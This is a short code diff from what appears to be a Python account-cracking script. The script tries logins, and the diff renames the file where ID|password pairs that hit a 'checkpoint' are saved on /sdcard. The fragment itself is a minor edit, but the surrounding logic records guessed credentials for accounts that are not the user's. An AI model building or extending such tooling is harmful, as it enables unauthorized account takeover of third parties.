@@ -103,7 +103,7 @@ for user in dx:
             oks.append(cid)
         elif 'checkpoint' in cookie_data:
             print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
-            open('/sdcard/NEW-FAIL.txt', 'a').write(f'{ids}|{pw}\n')
+            open('/sdcard/NEW-CHECKPOINT.txt', 'a').write(f'{ids}|{pw}\n')
             cps.append(ids)
         else:
             print("\n❌ FAIL: Login not successful.")
